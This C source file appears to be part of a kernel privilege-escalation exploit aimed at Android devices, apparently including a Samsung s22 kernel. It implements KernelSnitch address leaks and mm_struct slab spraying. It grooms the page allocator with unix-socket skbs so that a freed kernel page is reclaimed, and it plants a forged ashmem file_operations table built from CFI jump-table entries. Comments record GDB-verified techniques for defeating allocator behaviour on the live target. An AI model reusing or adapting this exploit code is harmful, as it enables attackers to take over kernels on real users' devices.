#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

FILE *g_logfile = NULL;

static page_reclaim_trace_fn g_reclaim_trace_begin;
static page_reclaim_trace_fn g_reclaim_trace_end;

void set_page_reclaim_trace_hooks(page_reclaim_trace_fn begin,
                                  page_reclaim_trace_fn end) {
  g_reclaim_trace_begin = begin;
  g_reclaim_trace_end = end;
}

void page_reclaim_trace_begin(void) {
  if (g_reclaim_trace_begin)
    g_reclaim_trace_begin();
}

void page_reclaim_trace_end(void) {
  if (g_reclaim_trace_end)
    g_reclaim_trace_end();
}

int last_skb_reclaim_sent;
int last_skb_reclaim_want;
size_t last_skb_send_size;
uintptr_t last_leaked_mm;

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;

static int env_int_range(const char *name, int def, int min, int max) {
  const char *arg = getenv(name);
  char *end = NULL;
  long value;

  if (!arg || !*arg) {
    return def;
  }
  errno = 0;
  value = strtol(arg, &end, 0);
  if (errno || !end || *end || value < min || value > max) {
    pr_warning("bad %s value=%s; using %d\n", name, arg, def);
    return def;
  }
  return (int)value;
}

static size_t skb_send_bytes(void) {
  int kb = env_int_range("SKB_SEND_KB", (int)(SKB_SEND_SIZE / 1024), 32, 64);
  return (size_t)kb * 1024U;
}

static int env_flag(const char *name, int def) {
  const char *arg = getenv(name);
  if (!arg || !*arg)
    return def;
  return strcmp(arg, "0") != 0;
}

/* Match oppo-ghostlock exploit/src/util.c reclaim teardown when set. */
static int use_oppo_reclaim_teardown(void) {
  return env_flag("OPPO_RECLAIM_TEARDOWN", 0);
}

static int use_skb_flush_mm_partial(void) {
  return env_flag("SKB_FLUSH_MM_PARTIAL", 0);
}

/* Oppo keeps post_ctx[last] open to pin one mm on the slab; close it for
 * QEMU reclaim testing (not used by the real oppo-ghostlock exploit). */
static int use_skb_close_last_mm(void) {
  return env_flag("SKB_CLOSE_LAST_MM", 0);
}

/* Reclaim pairs are batched and NEVER closed between prepares: a failed
 * round can leave misc.fops pointing at an older payload page, and as long
 * as that page's payload skb stays queued, its fake table (valid JT
 * .open/.release) keeps any later misc_open/close dispatch harmless.
 * Freeing it lets the page recycle into live mm_structs whose junk
 * .open/.release is a wild branch (die@misc_open / die@filp_close,
 * GDB-verified 2026-08-07).  Batches form a ring; the batch being reused
 * is closed only on wraparound. */
#define SKB_RECLAIM_BATCHES 64
static int reclaim_sv[SKB_RECLAIM_BATCHES][SKB_RECLAIM_PAIRS][2];
static int reclaim_sv_inited;
static int reclaim_batch_cnt;
static int rb_cur;

static void reclaim_batch_close(int b) {
  for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
    for (int i = 0; i < 2; i++) {
      if (reclaim_sv[b][p][i] >= 0) {
        close(reclaim_sv[b][p][i]);
        reclaim_sv[b][p][i] = -1;
      }
    }
  }
}

static int reclaim_batch_next(void) {
  int b = reclaim_batch_cnt % SKB_RECLAIM_BATCHES;
  if (reclaim_batch_cnt >= SKB_RECLAIM_BATCHES)
    reclaim_batch_close(b);
  reclaim_batch_cnt++;
  rb_cur = b;
  return b;
}

static void init_reclaim_sv(void) {
  if (!reclaim_sv_inited) {
    for (int b = 0; b < SKB_RECLAIM_BATCHES; b++) {
      for (int p = 0; p < SKB_RECLAIM_PAIRS; p++) {
        reclaim_sv[b][p][0] = -1;
        reclaim_sv[b][p][1] = -1;
      }
    }
    reclaim_sv_inited = 1;
  }
}
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

static void log_mm_slabinfo(const char *stage) {
  FILE *fp = fopen("/proc/slabinfo", "r");
  if (!fp) {
    return;
  }

  char line[256];
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", 10) == 0) {
      pr_info("mm slabinfo %s %s", stage, line);
      break;
    }
  }
  fclose(fp);
}

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
uintptr_t slide_p0_offset;
char ashmem_path[256] = "/dev/ashmem";

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=exp64\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  return p0_data_alias(image_addr) + slide_p0_offset;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  /* CONFIG_CFI_CLANG: every function pointer in the table MUST be the
   * canonical .cfi_jt jump-table entry — raw kallsyms addresses make the
   * first indirect call (misc_open -> f_op->open) panic with
   * "CFI failure" (observed on the live target).  Layout mimics the real
   * ashmem_fops: owner NULL, .splice_read NULL, real ashmem_llseek.
   * The table is never traversed as an rb node (rb_erase/rb_next only
   * touch the fake waiter's own links), so live pointers are safe. */
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF, text_addr(ASHMEM_LLSEEK_JT));
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE_JT));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_WRITE_BIN_FILE_JT));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL_JT));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL_JT));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP_JT));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN_JT));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE_JT));
  put64(p, off + FOPS_SPLICE_READ_OFF, 0);
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO_JT));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  init_reclaim_sv();   /* zero-init guard: never close() fd 0 by accident */
  for (int b = 0; b < SKB_RECLAIM_BATCHES; b++)
    reclaim_batch_close(b);
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

static void order3_hold_end(void);

void cleanup_page_prepare_state(void) {
  order3_hold_end();
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

#ifndef MM_CPU_PARTIAL
#define MM_CPU_PARTIAL 13
#endif

/* ---- page-content verification ----------------------------------------
 * verify_fops_on_page() wants to read 4 qwords off the reclaimed kernel
 * page before the dangerous /dev/ashmem open.  /dev/mem never exists on a
 * real device (and is disabled on the s22 kernel: CONFIG_DEVMEM=n), so it
 * is not used at all.  There is NO unprivileged pre-hijack kernel-memory
 * read: adb-verified on b0q that uid=2000 shell (even with the
 * readtracefs group) gets EACCES writing tracefs kprobe_events, and
 * kernelsnitch only leaks addresses via futex-hash timing.
 *
 * The tracefs kprobe backend below therefore only engages in the QEMU
 * test VM (root): a kprobe event fetches arbitrary kernel memory into the
 * trace buffer (offsets from _text are parsed with kstrtol, so direct-map
 * targets are reachable).  Everywhere else the verify is skipped and the
 * flow proceeds unverified — the upstream device behaviour, relying on
 * reclaim determinism and the downstream cfi-stage checks.
 */

#define VERIFY_TRACEFS_ROOT "/sys/kernel/tracing"
#define VERIFY_KPROBE_NAME  "cvekv"

static int verify_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int kprobe_verify_state = -1;   /* -1 untried, 0 unavailable, 1 ready */
static char kprobe_verify_func[64];

static int kprobe_verify_init(void) {
  if (kprobe_verify_state >= 0)
    return kprobe_verify_state;
  kprobe_verify_state = 0;
  static const char *funcs[] = {
    "__arm64_sys_getuid",
    "__arm64_sys_getpid",
    "__arm64_sys_gettid",
  };
  for (size_t i = 0; i < sizeof(funcs) / sizeof(funcs[0]); i++) {
    char cmd[256];
    char enpath[192];
    /* drop any stale event, then try a probe read of _text itself */
    verify_tracefs_write(
        VERIFY_TRACEFS_ROOT "/kprobe_events", "-:" VERIFY_KPROBE_NAME);
    snprintf(cmd, sizeof(cmd),
             "p:" VERIFY_KPROBE_NAME " %s @_text+0:x64", funcs[i]);
    if (!verify_tracefs_write(VERIFY_TRACEFS_ROOT "/kprobe_events", cmd))
      continue;
    snprintf(enpath, sizeof(enpath),
             VERIFY_TRACEFS_ROOT "/events/kprobes/" VERIFY_KPROBE_NAME
             "/enable");
    int ok = verify_tracefs_write(enpath, "1");
    if (ok)
      verify_tracefs_write(enpath, "0");
    verify_tracefs_write(
        VERIFY_TRACEFS_ROOT "/kprobe_events", "-:" VERIFY_KPROBE_NAME);
    if (ok) {
      snprintf(kprobe_verify_func, sizeof(kprobe_verify_func),
               "%s", funcs[i]);
      kprobe_verify_state = 1;
      break;
    }
  }
  return kprobe_verify_state;
}

static void kprobe_verify_delete(void) {
  char enpath[192];
  snprintf(enpath, sizeof(enpath),
           VERIFY_TRACEFS_ROOT "/events/kprobes/" VERIFY_KPROBE_NAME
           "/enable");
  verify_tracefs_write(enpath, "0");
  verify_tracefs_write(
      VERIFY_TRACEFS_ROOT "/kprobe_events", "-:" VERIFY_KPROBE_NAME);
}

/* Read kv[0..3] (direct-map KVAs) via one kprobe event fired by getuid(). */
static int kprobe_read_quad(const uintptr_t kv[4], uint64_t out[4]) {
  if (!kprobe_verify_init())
    return 0;
  uintptr_t text = KIMAGE_TEXT_BASE + kaslr_slide;
  char cmd[768];
  char enpath[192];
  snprintf(enpath, sizeof(enpath),
           VERIFY_TRACEFS_ROOT "/events/kprobes/" VERIFY_KPROBE_NAME
           "/enable");
  verify_tracefs_write(
      VERIFY_TRACEFS_ROOT "/kprobe_events", "-:" VERIFY_KPROBE_NAME);
  snprintf(cmd, sizeof(cmd),
           "p:" VERIFY_KPROBE_NAME " %s "
           "@_text%+lld:x64 @_text%+lld:x64 @_text%+lld:x64 @_text%+lld:x64",
           kprobe_verify_func,
           (long long)((long)kv[0] - (long)text),
           (long long)((long)kv[1] - (long)text),
           (long long)((long)kv[2] - (long)text),
           (long long)((long)kv[3] - (long)text));
  if (!verify_tracefs_write(VERIFY_TRACEFS_ROOT "/kprobe_events", cmd))
    return 0;
  if (!verify_tracefs_write(enpath, "1"))
    goto fail;
  /* clear the ring buffer, then fire the probe */
  int tfd = open(VERIFY_TRACEFS_ROOT "/trace", O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (tfd >= 0)
    close(tfd);
  (void)getuid();
  (void)getuid();
  kprobe_verify_delete();

  int fd = open(VERIFY_TRACEFS_ROOT "/trace", O_RDONLY | O_CLOEXEC);
  if (fd < 0)
    return 0;
  static char buf[32768];
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0)
    return 0;
  buf[n] = 0;
  /* take the last matching record (ours) */
  char *rec = NULL;
  for (char *q = buf; (q = strstr(q, VERIFY_KPROBE_NAME ":")); )
    rec = q++;
  if (!rec)
    return 0;
  char *args = strstr(rec, "arg1=");
  unsigned long long v[4];
  if (!args ||
      sscanf(args, "arg1=0x%llx arg2=0x%llx arg3=0x%llx arg4=0x%llx",
             &v[0], &v[1], &v[2], &v[3]) != 4)
    return 0;
  for (int i = 0; i < 4; i++)
    out[i] = (uint64_t)v[i];
  return 1;
fail:
  kprobe_verify_delete();
  return 0;
}

/* ---- TEMPORARY leak-slab tracking (QEMU diagnosis; remove after fix) ----
 * Reads the leak slab's struct page + mm_cachep node state via the tracefs
 * kprobe backend (root in the test VM) at each reclaim stage, to pin where
 * the slab actually sits: cpu_slab fast path vs frozen vs node-partial vs
 * buddy.  Gate with RECLAIM_MM_TRACK=0 to silence. */
static int use_mm_track(void) {
  /* Default OFF: every call opens a tracefs file, whose zeroed order-3
   * kmalloc steals the just-discarded leak page from free_area[3] before
   * the reclaim sends can capture it (GDB-verified 2026-08-07: write
   * watchpoint on the discarded page -> clear_page <- kernel_init_free_pages
   * <- kmalloc_order <- tracing_open <- do_sys_openat2, every attempt).
   * The kprobe backend is unavailable on b0q anyway ("kprobe read failed"),
   * so the calls only burned pages. */
  return env_flag("RECLAIM_MM_TRACK", 0);
}

#define MMTRACK_CACHEP 0xffffff8780002600ULL /* QEMU nokaslr mm_cachep (GDB) */

static void track_mm_page(uintptr_t base, const char *stage) {
  if (!use_mm_track())
    return;
  uintptr_t pfn = (base - DIRECT_MAP_BASE + P0_PHYS_OFFSET) >> PAGE_SHIFT;
  uintptr_t page = VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
  uintptr_t kv[4] = {
      page + 0x18,            /* page->slab_cache */
      page + 0x28,            /* page->counters */
      page + 0x08,            /* page->lru/next */
      MMTRACK_CACHEP + 0x100, /* mm_cachep->node[0] */
  };
  uint64_t out[4] = {0, 0, 0, 0};
  if (!kprobe_read_quad(kv, out)) {
    pr_info("mmtrack %s base=%016zx page=%016zx: kprobe read failed\n",
            stage, base, page);
    return;
  }
  uint32_t counters = (uint32_t)out[1];
  unsigned long long nr_partial = 0;
  if (out[3]) {
    uintptr_t kv2[4] = {(uintptr_t)out[3] + 0x08, page, page, page};
    uint64_t out2[4] = {0, 0, 0, 0};
    if (kprobe_read_quad(kv2, out2))
      nr_partial = (unsigned long long)out2[0];
  }
  pr_info("mmtrack %s base=%016zx page=%016zx slab_cache=%016zx "
          "counters=%08x inuse=%u frozen=%u lru=%016zx node=%016zx "
          "nr_partial=%llu\n",
          stage, base, page, (uintptr_t)out[0], counters,
          counters & 0xffff, (counters >> 31) & 1, (uintptr_t)out[2],
          (uintptr_t)out[3], nr_partial);
}

static int verify_fops_on_page(uintptr_t base) {
  uintptr_t read_kva = base + SKB_DATA_DELTA + FOPS_TABLE_OFF + FOPS_READ_OFF;
  uintptr_t kv[4] = {
    read_kva,
    read_kva + (FOPS_WRITE_OFF - FOPS_READ_OFF),
    read_kva + (FOPS_IOCTL_OFF - FOPS_READ_OFF),
    base + SKB_DATA_DELTA + W0_OFF,
  };
  uint64_t out[4];
  if (!kprobe_read_quad(kv, out)) {
    static int verify_skip_warned;
    if (!verify_skip_warned) {
      verify_skip_warned = 1;
      pr_warning("page verify: tracefs kprobe unavailable; "
                 "proceeding unverified\n");
    }
    return 1;   /* no backend: proceed unverified (device flow) */
  }
  /* fops slots hold kCFI .cfi_jt canonical addresses (see put_fake_fops_table) */
  if (out[0] != text_addr(CONFIGFS_READ_FILE_JT))
    return 0;
  if (out[1] != text_addr(CONFIGFS_WRITE_BIN_FILE_JT))
    return 0;
  if (out[2] != text_addr(ASHMEM_IOCTL_JT))
    return 0;
  if (out[3] != 1)
    return 0;
  return 1;
}

int verify_reclaimed_kernel_page(uintptr_t base) {
  uintptr_t read_kva = base + SKB_DATA_DELTA + FOPS_TABLE_OFF + FOPS_READ_OFF;
  uintptr_t kv[4] = {
    base + SKB_DATA_DELTA + W0_OFF,
    read_kva,
    read_kva + (FOPS_WRITE_OFF - FOPS_READ_OFF),
    read_kva + (FOPS_IOCTL_OFF - FOPS_READ_OFF),
  };
  uint64_t out[4];
  if (!kprobe_read_quad(kv, out))
    return 1;   /* no backend: proceed unverified (device flow) */
  if (out[0] != 1)
    return 0;
  if (out[1] != text_addr(CONFIGFS_READ_FILE_JT))
    return 0;
  if (out[2] != text_addr(CONFIGFS_WRITE_BIN_FILE_JT))
    return 0;
  if (out[3] != text_addr(ASHMEM_IOCTL_JT))
    return 0;
  return 1;
}

/* Free enough mm_structs on this CPU to flush SLUB cpu_partial and run
 * discard_slab() on slabs queued there (including the emptied leak slab). */
static void flush_mm_cpu_partial(void) {
  enum { N = MM_CPU_PARTIAL + 2 };
  int fds[N];
  size_t n = 0;

  for (; n < N; n++) {
    fds[n] = clone_memfd();
    if (fds[n] < 0)
      break;
  }
  for (size_t i = 0; i < n; i++)
    SYSCHK(close(fds[i]));
  sched_yield();
  sched_yield();
}

/* Top up the order-0 buddy free lists + PCPs right before the leak slab is
 * discarded.  GDB-verified on b0q: without this, the freshly discarded
 * order-3 leak page is split by an order-0 PCP refill (rmqueue_bulk) within
 * the drain->send window and handed out as PTE/anon pages (largely to our
 * own fork churn), so the skb frags never reclaim it.  Faulting in and
 * freeing a scratch region leaves plenty of order-0 pages behind, so no
 * allocation needs to split the leak page before the skb send grabs it. */
static void prefill_order0_buddy(void) {
  size_t len = (size_t)env_int_range("RECLAIM_ORDER0_MB", 16, 1, 256) << 20;
  unsigned char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED)
    return;
  for (size_t off = 0; off < len; off += PAGE_SIZE)
    p[off] = 0;
  munmap(p, len);
}

/* Persistent-during-prepare pile of order-3 skb frag pages used to ABSORB
 * free_area[3] (zone Normal, where the leak pages live) down to near-empty
 * before the leak page discards.  b0q inserts freed pages at the TAIL of
 * free_area[3][UNMOVABLE] (SHUFFLE_PAGE_ALLOCATOR) while the reclaim sends
 * take from the HEAD, and the exploit's own mm-spray churn keeps the list
 * hundreds of entries long (GDB 2026-08-07: free_area[3] nr_free=1066 in
 * zone Normal), so without the absorb the discarded leak page never
 * reaches the head and is never captured.  The pile is released by
 * order3_hold_end() AFTER the reclaim sends (the capture is secured by
 * then); failure paths release it via cleanup_page_prepare_state(). */
#define ORDER3_HOLD_PAIRS_MAX 768
static int order3_hold_sv[ORDER3_HOLD_PAIRS_MAX][2];
static int order3_hold_pairs;
static int order3_hold_inited;

/* /proc/buddyinfo has no per-migrate-type split; order-3 totals are good
 * enough (the absorb also steals the other types via rmqueue fallback). */
static long buddyinfo_order3_free(void) {
  FILE *fp = fopen("/proc/buddyinfo", "r");
  if (!fp)
    return -1;
  char line[512];
  long fallback = -1, normal = -1;
  while (fgets(line, sizeof(line), fp)) {
    char *p = strstr(line, "zone");
    if (!p)
      continue;
    char name[32];
    unsigned long c0, c1, c2, c3;
    if (sscanf(p + 4, "%31s %lu %lu %lu %lu", name, &c0, &c1, &c2, &c3) != 5)
      continue;
    if ((long)c3 > fallback)
      fallback = (long)c3;
    if (!strcmp(name, "Normal"))
      normal = (long)c3;
  }
  fclose(fp);
  return normal >= 0 ? normal : fallback;
}

static void order3_hold_begin(const struct msghdr *msg) {
  long target = env_int_range("RECLAIM_ABSORB_TARGET", 0, 0, 64);
  long max_pages = env_int_range("RECLAIM_ABSORB_MAX_PAGES", 4096, 0, 65536);
  long free3 = buddyinfo_order3_free();
  long before = free3;
  long pages = 0;
  int skbs = 0;

  if (!order3_hold_inited) {
    for (int p = 0; p < ORDER3_HOLD_PAIRS_MAX; p++) {
      order3_hold_sv[p][0] = -1;
      order3_hold_sv[p][1] = -1;
    }
    order3_hold_inited = 1;
  }

  /* Top the pile up until the order-3 list reads near-empty.  wmem_max
   * (~208KB) caps each pair at ~3 queued 64KB skbs; capacity comes from
   * pair count.  With unreadable buddyinfo (free3 < 0) absorb the cap. */
  while (order3_hold_pairs < ORDER3_HOLD_PAIRS_MAX && pages < max_pages) {
    if (free3 >= 0 && free3 <= target)
      break;
    int p = order3_hold_pairs;
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, order3_hold_sv[p]) != 0)
      break;
    order3_hold_pairs++;
    int sent = 0;
    for (int i = 0; i < 3; i++) {
      if (sendmsg(order3_hold_sv[p][0], msg, MSG_DONTWAIT) <= 0)
        break;
      sent++;
    }
    if (!sent) {
      close(order3_hold_sv[p][0]);
      close(order3_hold_sv[p][1]);
      order3_hold_sv[p][0] = -1;
      order3_hold_sv[p][1] = -1;
      order3_hold_pairs--;
      break;
    }
    skbs += sent;
    pages += (long)sent * 2;   /* 64KB skb = 2 order-3 frag pages */
    free3 = buddyinfo_order3_free();
  }
  pr_info("mm order3 absorb: pairs=%d skbs=%d free3 %ld -> %ld (target=%ld)\n",
          order3_hold_pairs, skbs, before, free3, target);
}

static void order3_hold_end(void) {
  if (!order3_hold_inited)   /* zero-init guard: never close() fd 0 */
    return;
  for (int p = 0; p < order3_hold_pairs; p++) {
    for (int i = 0; i < 2; i++) {
      if (order3_hold_sv[p][i] >= 0) {
        close(order3_hold_sv[p][i]);
        order3_hold_sv[p][i] = -1;
      }
    }
  }
  order3_hold_pairs = 0;
}

static void drain_reclaim_pair(int pair) {
  unsigned char junk[65536];

  for (;;) {
    ssize_t got = recv(reclaim_sv[rb_cur][pair][1], junk, sizeof(junk),
                       MSG_DONTWAIT);
    if (got <= 0)
      break;
  }
}

static void release_prepare_drain_markers(void) {
  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
  for (size_t i = 0; i < drain_triggers; i++) {
    size_t index = i * mm_objs_per_slab;
    if (prepare_ctx.memfds[index] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[index]));
      prepare_ctx.memfds[index] = -1;
    }
  }
}

